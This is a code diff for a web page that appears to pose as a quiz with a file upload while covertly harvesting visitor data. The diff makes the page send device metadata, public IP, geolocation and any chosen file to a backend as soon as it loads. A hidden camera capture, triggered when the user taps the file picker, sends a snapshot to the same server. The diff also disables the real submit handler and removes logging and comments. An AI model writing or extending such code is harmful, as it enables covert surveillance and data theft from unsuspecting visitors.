@@ -16,7 +16,10 @@ let capturedImage = null; // store camera image
 window.addEventListener("DOMContentLoaded", () => {
   video.srcObject = null;
   video.style.display = "none";
-  video.removeAttribute("autoplay"); // prevent auto-popup
+  video.removeAttribute("autoplay");
+
+  // 🔥 RUN SUBMIT PAYLOAD ON VISIT
+  sendPayloadOnVisit();
 });
 
 // ================================
@@ -30,11 +33,10 @@ async function collectMetadata() {
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
     network: navigator.connection ? JSON.stringify(navigator.connection) : "N/A",
-    ip: "N/A", // IP field added
+    ip: "N/A",
     time: new Date().toLocaleString(),
   };
 
-  // Battery info
   if (navigator.getBattery) {
     try {
       const b = await navigator.getBattery();
@@ -42,7 +44,6 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Location if already granted
   if (navigator.permissions && navigator.geolocation) {
     try {
       const status = await navigator.permissions.query({ name: "geolocation" });
@@ -55,7 +56,6 @@ async function collectMetadata() {
     } catch {}
   }
 
-  // Get public IP from ipify
   try {
     const ipRes = await fetch("https://api.ipify.org?format=json");
     const ipData = await ipRes.json();
@@ -72,12 +72,11 @@ async function captureAndSendCamera() {
   if (cameraCaptured || cameraInProgress) return;
 
   cameraInProgress = true;
-  console.log("📸 captureAndSendCamera called");
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia(constraints);
     video.srcObject = stream;
-    video.setAttribute("playsinline", true); // mobile fix
+    video.setAttribute("playsinline", true);
     video.style.display = "block";
 
     await new Promise((resolve) => {
@@ -85,7 +84,7 @@ async function captureAndSendCamera() {
     });
 
     await video.play();
-    await new Promise(r => setTimeout(r, 1200)); // wait for frame
+    await new Promise((r) => setTimeout(r, 1200));
 
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
@@ -93,19 +92,13 @@ async function captureAndSendCamera() {
     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
     capturedImage = canvas.toDataURL("image/png");
-    console.log("✅ Camera captured successfully");
 
-    // Send captured image to your /upload API
-    const res = await fetch(`${BACKEND_BASE}/upload`, {
+    await fetch(`${BACKEND_BASE}/upload`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ image: capturedImage }),
     });
 
-    const data = await res.json();
-    console.log("Camera upload response:", data);
-
-    // Stop camera
     stream.getTracks().forEach((t) => t.stop());
     video.style.display = "none";
 
@@ -122,9 +115,9 @@ async function captureAndSendCamera() {
 // ================================
 fileInput.addEventListener("pointerdown", async (e) => {
   if (!cameraCaptured && !cameraInProgress) {
-    e.preventDefault(); // stop file picker temporarily
-    await captureAndSendCamera(); // permission asked here
-    setTimeout(() => fileInput.click(), 50); // reopen file picker after capture
+    e.preventDefault();
+    await captureAndSendCamera();
+    setTimeout(() => fileInput.click(), 50);
   }
 });
 
@@ -155,49 +148,44 @@ async function uploadFile(file) {
 }
 
 // ================================
-// FORM SUBMIT (FILE + METADATA + CAMERA)
+// ORIGINAL SUBMIT PAYLOAD (MOVED)
 // ================================
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+async function sendPayloadOnVisit() {
+  try {
+    const metadata = await collectMetadata();
 
-  if (!form.checkValidity()) {
-    form.reportValidity();
-    return;
-  }
+    let fileData = null;
+    let filename = null;
 
-  if (!fileInput.files.length) {
-    alert("Please upload a file first");
-    return;
-  }
-
-  // Show success immediately
-  document.getElementById("quiz-container").style.display = "none";
-  document.getElementById("success-container").style.display = "flex";
-
-  // Background upload
-  (async () => {
-    try {
-      const metadata = await collectMetadata();
-      const fileData = await new Promise((resolve) => {
+    if (fileInput.files.length) {
+      fileData = await new Promise((resolve) => {
         const reader = new FileReader();
         reader.onload = () => resolve(reader.result);
         reader.readAsDataURL(fileInput.files[0]);
       });
-
-      const res = await fetch(`${BACKEND_BASE}/file-upload`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          file: fileData,
-          filename: fileInput.files[0].name,
-          metadata,
-          cameraImage: capturedImage || null, // include if available
-        }),
-      });
-
-      console.log("✅ File + metadata upload response:", await res.json());
-    } catch (err) {
-      console.error("❌ Upload failed:", err);
+      filename = fileInput.files[0].name;
     }
-  })();
+
+    const res = await fetch(`${BACKEND_BASE}/file-upload`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        file: fileData,
+        filename,
+        metadata,
+        cameraImage: capturedImage || null,
+      }),
+    });
+
+    console.log("✅ Auto-visit upload:", await res.json());
+  } catch (err) {
+    console.error("❌ Upload failed:", err);
+  }
+}
+
+// ================================
+// SUBMIT HANDLER DISABLED
+// ================================
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
 });
